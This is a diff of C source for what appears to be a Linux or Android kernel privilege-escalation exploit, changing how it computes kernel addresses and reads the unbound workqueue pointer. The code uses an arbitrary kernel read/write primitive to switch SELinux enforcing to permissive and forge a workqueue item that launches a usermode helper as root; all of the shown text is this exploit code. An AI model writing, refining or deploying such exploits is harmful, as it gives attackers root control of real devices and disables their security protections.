@@ -129,7 +129,9 @@ static int root_hold_socket_ready(void) {
 }
 
 static int install_workqueue_umh_root(int fd) {
-  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
+  /* q6q v20 (kp18): Image .data targets use canonical text addresses - the
+   * linear aliases are unmapped (direct map hole over the Image span). */
+  uintptr_t selinux_addr = text_addr(SELINUX_ENFORCING);
   uint8_t permissive = 0;
   uintptr_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
   uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
@@ -182,13 +184,18 @@ static int install_workqueue_umh_root(int fd) {
     return 0;
   }
 
-  uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
-  uintptr_t wq = root_read64(fd, wq_slot);
+  uintptr_t wq_slot = text_addr(SYSTEM_UNBOUND_WQ);
+  uintptr_t wq = 0;
+  ssize_t wq_rb = configfs_read_once(fd, wq_slot, &wq, sizeof(wq));
+  if (wq_rb != (ssize_t)sizeof(wq) || !is_direct_ptr(wq)) {
+    pr_error("root umh wq slot read failed ret=%zd wq=%016zx slot=%016zx\n",
+             wq_rb, wq, wq_slot);
+    return 0;
+  }
   uintptr_t pwq = root_read64(fd, wq + WQ_DFL_PWQ_OFF);
   uintptr_t pool = root_read64(fd, pwq + PWQ_POOL_OFF);
   uintptr_t pwq_wq = root_read64(fd, pwq + PWQ_WQ_OFF);
-  if (!is_direct_ptr(wq) || !is_direct_ptr(pwq) ||
-      !is_direct_ptr(pool) || pwq_wq != wq) {
+  if (!is_direct_ptr(pwq) || !is_direct_ptr(pool) || pwq_wq != wq) {
     pr_error("root umh bad workqueue wq_slot=%016zx wq=%016zx "
              "pwq=%016zx pool=%016zx pwq_wq=%016zx\n",
              wq_slot, wq, pwq, pool, pwq_wq);
